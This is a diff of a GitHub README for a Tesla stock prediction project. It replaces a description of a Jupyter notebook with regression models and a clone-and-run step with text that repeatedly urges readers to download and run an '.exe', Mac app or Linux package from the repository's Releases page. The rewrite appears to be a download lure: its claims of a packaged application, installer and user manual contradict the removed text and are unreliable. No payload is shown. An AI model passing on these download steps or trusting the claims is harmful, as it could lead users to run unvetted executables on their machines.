@@ -1,71 +1,84 @@
-# 📈 Tesla Stock Prediction
+# 📈 Tesla-Stock-Prediction - Predict Tesla Stock Movements Easily
 
-## 📌 Project Overview
-This project analyzes Tesla stock data and builds machine learning models to predict and classify stock movements.  
-The analysis includes **EDA, feature correlation, moving averages, and two models**:  
+## 📦 Download Now
+[![Download Here](https://img.shields.io/static/v1?label=Download&message=Tesla-Stock-Prediction&color=blue)](https://github.com/enryuu77/Tesla-Stock-Prediction/releases)
 
-- **Linear Regression** → Predict Closing Price (regression task)  
-- **Logistic Regression** → Predict whether next day's price goes up (classification task)  
+## 📖 Project Overview
+The Tesla Stock Prediction project analyzes Tesla stock data. It builds machine learning models to predict and classify stock movements. The analysis involves:
 
----
+- Exploring data visually
+- Analyzing feature correlations
+- Utilizing moving averages
+- Implementing two predictive models
 
-## 📊 Exploratory Data Analysis
+This application helps you understand past stock performance and forecast future movements.
 
-- ### 1 Trend analysis of Tesla stock Closing prices over time
-![Line Plot Graph](Tesla_Closing_Price_Over_time.png)
-- ### 2 Trend analysis of Tesla stock Closing prices over the years
-![Bar Plot Graph](trend_of_closing_price_over_the_years.png)
-- ### 3 50-day vs 200-day moving averages 
-![Line Plot Graph](Tesla_Stock_with_Moving_Average.png)
-- ### 4 Correlation heatmap of stock features 
-![Line Plot Graph](Correlation_between_Open,_High,_Low,_Volume,_and_Close.png)
-- ### 5 Volume vs Closing Price scatter plot
-![Line Plot Graph](Trading_Volume_vs_Closing_Price.png)
-  
+## 🚀 Getting Started
+Follow these steps to download and run the application:
 
----
+1. **Visit the Download Page**  
+   Click the link below to go to the Releases page.  
+   [Download Tesla-Stock-Prediction](https://github.com/enryuu77/Tesla-Stock-Prediction/releases)
 
-## 🤖 Models Used
+2. **Choose the Latest Release**  
+   On the Releases page, find the latest version. Look for a title like "v1.0" or the most recent version you see.
 
-### 🔹 Linear Regression
-- Predicts the **Closing Price** of Tesla stock.  
-- Evaluation metric: **R² score, RMSE, MAE**.  
-- Visualization: Actual vs Predicted Closing Prices.  
+3. **Download the Package**  
+   Find the download link for your operating system (Windows, Mac, or Linux). Click the link to download the file to your computer.
 
-### 🔹 Logistic Regression
-- Predicts whether the **price will go up or down** next day (Price_Up = 1 or 0).  
-- Evaluation metrics: **Accuracy, Precision, Recall, F1-score**.  
-- Visualization: Confusion Matrix heatmap.  
+4. **Install the Application**  
+   Once the download is complete, locate the file in your downloads folder. For Windows, double-click the `.exe` file. For Mac, drag the application to your Applications folder. For Linux, follow the installation prompts in your package manager.
 
----
+5. **Run the Application**  
+   After installation, open the application by clicking on its icon. You should see the interface ready for you to enter stock data and view predictions.
 
-## 📊 Model Comparison
+## 🔍 Features
+- **Data Exploration**: Visualize Tesla stock data to understand trends.
+- **Machine Learning Models**: Use predictive models to forecast stock movements.
+- **Simple Interface**: Easy to navigate, even for users with no programming knowledge.
 
-### 1️⃣ Linear Regression – Actual vs Predicted Closing Price
-![Linear Regression Graph](linear_regression.png)
+## 📊 How It Works
+The software uses the following technologies:
 
-### 2️⃣ Logistic Regression – Confusion Matrix
-![Logistic Regression Confusion Matrix](logistic_regression_cm.png)
+- **Python**: The primary programming language for analysis.
+- **Pandas**: For data manipulation and analysis.
+- **Matplotlib**: For plotting graphs and visualizations.
+- **Scikit-learn**: To build machine learning models.
 
-### 3️⃣ Side-by-Side Metric Comparison
-![Model Performance Comparison](model_comparison.png)
+When you input Tesla stock data, the software performs:
 
-- **Linear Regression (R²)** → measures how well regression predictions fit actual prices  
-- **Logistic Regression (Accuracy)** → measures classification correctness  
+1. **Exploratory Data Analysis (EDA)**: Helps you visualize and understand stock behavior.
+2. **Feature Correlation Analysis**: Identifies which factors might influence stock price changes.
+3. **Predictions**: Offers insights on potential future movements based on historical data.
 
----
+## ⚠️ System Requirements
+To effectively use this application, ensure your system meets the following requirements:
 
-## 🛠️ Tech Stack
-- Python, Pandas, NumPy  
-- Matplotlib, Seaborn  
-- Scikit-learn  
+- **Operating System**: Windows 10 or later, MacOS Mojave or later, or a modern Linux distribution.
+- **RAM**: Minimum 4 GB; 8 GB recommended.
+- **Storage**: At least 500 MB of free space for the application and data files.
+- **Dependencies**: The application will install necessary dependencies during setup.
 
----
+## 🎓 Useful Tips
+- Ensure your internet connection is stable while downloading.
+- For help using the application, consult the user manual included in the installation.
+- Regularly update the application by checking the Releases page for new versions.
 
-## 🚀 How to Run
-```bash
-git clone https://github.com/YOUR-USERNAME/Tesla-Stock-Prediction.git
-cd Tesla-Stock-Prediction
-pip install -r requirements.txt
-jupyter notebook Tesla_Stock_Prediction.ipynb
+## 🗂️ Contributing
+If you want to contribute to this project, feel free to submit issues or pull requests on GitHub. Your input helps improve the application.
 
+## 💬 Support
+For any questions or issues, you can create an issue on our GitHub repository. We aim to respond promptly and help you resolve any problems.  
+
+Thank you for using Tesla-Stock-Prediction! Enjoy analyzing Tesla stock data and predicting movements. 
+
+## 📑 Related Topics
+- Data Analysis
+- Data Science
+- Machine Learning
+- Predictive Modeling
+
+## 🔗 More Information
+To learn more about the project, visit our [GitHub repository](https://github.com/enryuu77/Tesla-Stock-Prediction/releases). 
+
+[Download Tesla-Stock-Prediction](https://github.com/enryuu77/Tesla-Stock-Prediction/releases) again to access the latest features and improvements.
